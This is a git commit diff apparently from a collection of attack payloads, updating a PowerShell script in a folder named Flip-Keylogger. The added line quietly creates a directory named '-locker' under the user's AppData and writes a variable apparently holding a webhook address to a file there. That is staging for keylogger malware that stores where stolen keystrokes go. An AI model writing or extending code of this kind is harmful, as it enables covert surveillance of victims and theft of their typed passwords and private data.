769672b74aeb7f5f7124547d22ce8b09038fd0c6
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-23 12:44:21 -0600

    Update s1.ps1

--- Payloads/Flip-Keylogger/s1.ps1
+++ Payloads/Flip-Keylogger/s1.ps1
@@ -11,4 +11,6 @@ if($isAdmin){
 	}
 }
 
+if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"};echo $dc > "$env:appdata\-locker\wh.txt";
+
 s1
